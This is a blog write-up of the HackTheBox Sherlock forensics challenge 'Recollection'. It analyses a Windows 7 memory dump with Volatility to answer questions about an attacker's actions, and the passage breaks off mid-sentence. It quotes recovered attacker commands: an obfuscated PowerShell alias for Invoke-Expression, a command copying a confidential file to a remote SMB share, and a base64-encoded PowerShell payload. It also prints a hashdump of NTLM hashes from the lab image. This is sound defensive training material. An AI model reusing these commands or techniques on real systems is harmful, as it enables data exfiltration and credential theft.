---
layout: post
date: 07-05-2024
author: Julio
---

<div class="center"><img src="https://labs.hackthebox.com/storage/challenges/605ff764c617d3cd28dbbdd72be8f9a2.png" width="350"></div>

# Recollection Write-Up

## Introduction

<p>Recollection is an "Easy" sherlock challenge on HackTheBox. This is the scenario: "A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below."</p>
<p>We start with a file called recollection.zip and we unzip it to get recollection.bin</p>

## Questions

### What is the Operating System of the machine?

<p>Judging my the scenario description, we are dealing with a memory dump. We can use a tool called "Volatility" to interact with it - we will be using both its version 2 and version 3. Assuming the memory dump was taken from a Windows machine, we can run the following command to get more information on the system:</p>

```bash
python3 vol.py -f ../recollection.bin windows.info
Volatility 3 Framework 2.7.0
Progress:  100.00		PDB scanning finished
Variable	Value

Kernel Base	0xf8000285c000
DTB	0x187000
Symbols	file:///Users/julio/Downloads/Recollection/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdDebuggerDataBlock	0xf80002a3f120
NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_
CSDVersion	1
KdVersionBlock	0xf80002a3f0e8
Major/Minor	15.7601
MachineType	34404
KeNumberProcessors	1
SystemTime	2022-12-19 16:07:30
NtSystemRoot	C:\Windows
NtProductType	NtProductWinNt
NtMajorVersion	6
NtMinorVersion	1
PE MajorOperatingSystemVersion	6
PE MinorOperatingSystemVersion	1
PE Machine	34404
PE TimeDateStamp	Thu Aug  2 02:18:10 2018
```

<p>We can see <custom-code>NTBuildLab	7601.24214.amd64fre.win7sp1_ldr_</custom-code>, which indicates that the right answer is <custom-code>Windows 7</custom-code>.</p>

### When was the memory dump created?

<p>The previous command also answers this one. The dump time is the system time. The right answer is <custom-code>2022-12-19 16:07:30</custom-code>.</p>

### After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

<p>We can use Volatility 2 to retrieve the contents of the clipboard</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 clipboard
Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                         Handle Object             Data
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260
         1 WinSta0       0x0L                              0x0 ------------------
```

<p>The right answer is <custom-code>(gv '*MDR*').naMe[3,11,2]-joIN''</custom-code>.</p>

### The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

<p>We can run the following command to get more information on the console history.</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 consoles
Volatility Foundation Volatility Framework 2.6
**************************************************
[...snip]
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
iex
PS C:\Users\user>
```

<p><custom-code>iex</custom-code> corresponds to <custom-code>Invoke-Expression</custom-code>, which is the right answer.</p>

### A CMD command was executed to attempt to exfiltrate a file. What is the full command line?

<p>The same command executed above will iive us the answer:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 consoles
Volatility Foundation Volatility Framework 2.6
**************************************************
ConsoleProcess: conhost.exe Pid: 3524
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe - powershell
AttachedProcess: powershell.exe Pid: 3532 Handle: 0xdc
AttachedProcess: cmd.exe Pid: 4052 Handle: 0x60
----
CommandHistory: 0xc2c50 Application: powershell.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xbef50 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 6 LastAdded: 5 LastDisplayed: 5
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0xdc
Cmd #0 at 0xc71c0: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
Cmd #1 at 0xbf230: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
```

<p>The right answer is <custom-code>type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt</custom-code>.</p>

### Following the above command, now tell us if the file was exfiltrated successfully?

<p>The output of the above command will also tell us if the command was successful or not according to stdout.</p>

```bash
[...snip]
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt
The network path was not found.
[...snip]
```

<p>We can see that a network path was not found. Thus, the answer is <custom-code>NO</custom-code>.</p>

### The attacker tried to create a readme file. What was the full path of the file?

The output of the same command gives us the answer to this question:

```bash
[...snip]
Cmd #3 at 0x1be6e0: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
[...snip]
```

<p>We can see that an obfuscated command was run. As it is a base64-encoded text, we can easily decode it:</p>

```bash
echo "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi" | base64 -d
echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```

<p>The right answer is <custom-code>C:\Users\Public\Office\readme.txt</custom-code>.</p>

### What was the Host Name of the machine?

<p>First, we will dump the hives:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 hivelist
Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a004266010 0x000000009a90f010 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a004a41010 0x000000009df13010 \SystemRoot\System32\Config\DEFAULT
0xfffff8a004a57010 0x000000009ddb9010 \SystemRoot\System32\Config\SAM
0xfffff8a00000d190 0x00000000a9882190 [no name]
0xfffff8a000024010 0x00000000a96fa010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a00004f010 0x00000000a9725010 \REGISTRY\MACHINE\HARDWARE
0xfffff8a0006d4010 0x0000000081300010 \SystemRoot\System32\Config\SECURITY
0xfffff8a000733010 0x00000000a1d49010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a000ca4010 0x000000009f5fb010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a000d35010 0x00000000976ff010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a00125b010 0x0000000083a0c010 \??\C:\Users\user\ntuser.dat
0xfffff8a0012e3010 0x000000007cb5d010 \??\C:\Users\user\AppData\Local\Microsoft\Windows\UsrClass.dat
0xfffff8a00257e010 0x0000000106fd2010 \??\C:\System Volume Information\Syscache.hve
```

<p>We are interesting in <custom-code>0xfffff8a000024010 0x00000000a96fa010 \REGISTRY\MACHINE\SYSTEM</custom-code>. Once we have the offset of the virtual address, we can run the following command to retrieve the hostname:</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 printkey -o 0xfffff8a000024010 -K 'ControlSet001\Control\ComputerName\ComputerName'
Volatility Foundation Volatility Framework 2.6
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2022-12-10 23:48:28 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) USER-PC
```

<p>The right answer is <custom-code>USER-PC</custom-code>.</p>

### How many user accounts were in the machine?

<p>We can run a hashdump command to retrieve hashes of all the users in the machine.</p>

```bash
./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone -f ../recollection.bin --profile=Win7SP1x64_23418 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:5915a7959c04d8560468296edaefbc9b:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:cb6003ecf6b98b5f7fbbb03df798ac76:::
```

<p>Since the question asks about user accounts, I will not be considering the
